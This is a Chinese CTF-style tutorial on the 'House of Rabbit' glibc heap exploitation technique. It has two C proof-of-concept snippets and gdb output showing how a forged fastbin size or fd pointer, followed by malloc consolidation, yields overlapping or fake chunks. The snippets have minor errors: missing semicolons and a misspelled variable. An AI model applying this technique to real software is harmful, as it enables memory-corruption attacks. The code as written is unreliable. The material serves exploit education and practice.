# House of Rabbit

## 介绍
House of rabbit是一种伪造堆块的技术，早在2017年已经提出，但在最近两个月才在CTF比赛中出现。我们一般运用在fastbin attack中，因为unsorted bin等其它的bin有更好的利用手段。

## 原理
我们知道，fastbin中会把相同的size的被释放的堆块用一个单向链表管理，分配的时候会检查size是否合理，如果不合理程序就会异常退出。而house of rabbit就利用了在malloc consolidate的时候fastbin中的堆块进行合并时size没有进行检查从而伪造一个假的堆块，为进一步的利用做准备。

由于原作者的[POC](https://github.com/shift-crops/House_of_Rabbit)需要的条件较多，这里我直接介绍这个攻击的本质即可。

`前提条件`:
1. 可以修改fastbin的fd指针或size
2. 可以触发malloc consolidate(merge top或malloc big chunk等等)


下面来看一下POC
`POC 1`: modify the size of fastbin chunk
```cpp
unsigned long* chunk1=malloc(0x40); //0x602000
unsigned long* chunk2=malloc(0x40); //0x602050
malloc(0x10);
free(chunk1);
free(chunk2);
/* Heap layout
0000| 0x602000 --> 0x0 
0008| 0x602008 --> 0x51 ('Q')
0016| 0x602010 --> 0x0 
..... 
0080| 0x602050 --> 0x0 
0088| 0x602058 --> 0x51 ('Q')
0096| 0x602060 --> 0x602000 --> 0x0 
0104| 0x602068 --> 0x0 
...... 
0160| 0x6020a0 --> 0x0 
0168| 0x6020a8 --> 0x21 ('!')
0176| 0x6020b0 --> 0x0 
0184| 0x6020b8 --> 0x0 
*/
chunk1[-1]=0xa1; //modify chunk1 size to be 0xa1
malloc(0x1000);  //allocate a large chunk, trigger malloc consolidate
/*Chunk1 overlap with chunk2 now
gdb-peda$ telescope 0x602000 100
0000| 0x602000 --> 0x0 
0008| 0x602008 --> 0xa1 
0016| 0x602010 --> 0x7ffff7dd1c08 --> 0x7ffff7dd1bf8 --> 0x7ffff7dd1be8 --> 0x7ffff7dd1bd8 --> 0x7ffff7dd1bc8 (--> ...)
0024| 0x602018 --> 0x7ffff7dd1c08 --> 0x7ffff7dd1bf8 --> 0x7ffff7dd1be8 --> 0x7ffff7dd1bd8 --> 0x7ffff7dd1bc8 (--> ...)
0032| 0x602020 --> 0x0 
.....
0080| 0x602050 --> 0x0 
0088| 0x602058 --> 0x51 ('Q')
0096| 0x602060 --> 0x7ffff7dd1bb8 --> 0x7ffff7dd1ba8 --> 0x7ffff7dd1b98 --> 0x7ffff7dd1b88 --> 0x7ffff7dd1b78 (--> ...)
0104| 0x602068 --> 0x7ffff7dd1bb8 --> 0x7ffff7dd1ba8 --> 0x7ffff7dd1b98 --> 0x7ffff7dd1b88 --> 0x7ffff7dd1b78 (--> ...)
0112| 0x602070 --> 0x0 
0120| 0x602078 --> 0x0 
....
0152| 0x602098 --> 0x0 
0160| 0x6020a0 --> 0xa0 
0168| 0x6020a8 --> 0x20 (' ')

gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
                  top: 0x603450 (size : 0x1fbb0) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x050)  smallbin[ 3]: 0x602050
(0x0a0)  smallbin[ 8]: 0x602000 (overlap chunk with 0x602050(freed) )
*/
```
`POC 2`:modify FD pointer
```cpp
unsigned long* chunk1=malloc(0x40); //0x602000
unsigned long* chunk2=malloc(0x100);//0x602050

chunk2[1]=0x31; //fake chunk size 0x30
chunk2[7]=0x21  //fake chunk's next chunk
chunk2[11]=0x21 //fake chunk's next chunk's next chuck
/* Heap laylout
0000| 0x602000 --> 0x0 
0008| 0x602008 --> 0x51 ('Q')
0016| 0x602010 --> 0x0 
......
0080| 0x602050 --> 0x0 
0088| 0x602058 --> 0x111 
0096| 0x602060 --> 0x0 
0104| 0x602068 --> 0x31 ('1')
0112| 0x602070 --> 0x0 
......
0144| 0x602090 --> 0x0 
0152| 0x602098 --> 0x21 ('!')
0160| 0x6020a0 --> 0x0 
0168| 0x6020a8 --> 0x0 
0176| 0x6020b0 --> 0x0 
0184| 0x6020b8 --> 0x21 ('!')
0192| 0x6020c0 --> 0x0 
......
0352| 0x602160 --> 0x0 
0360| 0x602168 --> 0x20ea1
*/
free(chunk1);
chuck1[0]=0x602060;// modify the fd of chunk1
/*
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x602000 --> 0x602060 (size error (0x30)) --> 0x0
*/
malloc(5000);// malloc a  big chunk to trigger malloc consolidate
/*
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
                  top: 0x6034f0 (size : 0x1fb10) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x050)  smallbin[ 3]: 0x602000
(0x030)  smallbin[ 1]: 0x602060
*/
```

原理很简单，就是通过修改fastbin chunk的size(如上面的POC 1所示)直接构造overlap chunk，或者修改fd(如面的POC 2所示)，让它指向一个fake chunk，触发malloc consolidate之后让这个fake chunk成为一个合法的chunk。

## 总结
House of rabbit的优点是容易构造overlap chunk，由于可以基于fastbin attack，甚至不需要leak就可以完成攻击。大家可以通过例题的练习加深对这个攻击的理解。

## 例题
1. HITB-GSEC-XCTF 2018 mutepig
2. 待补充








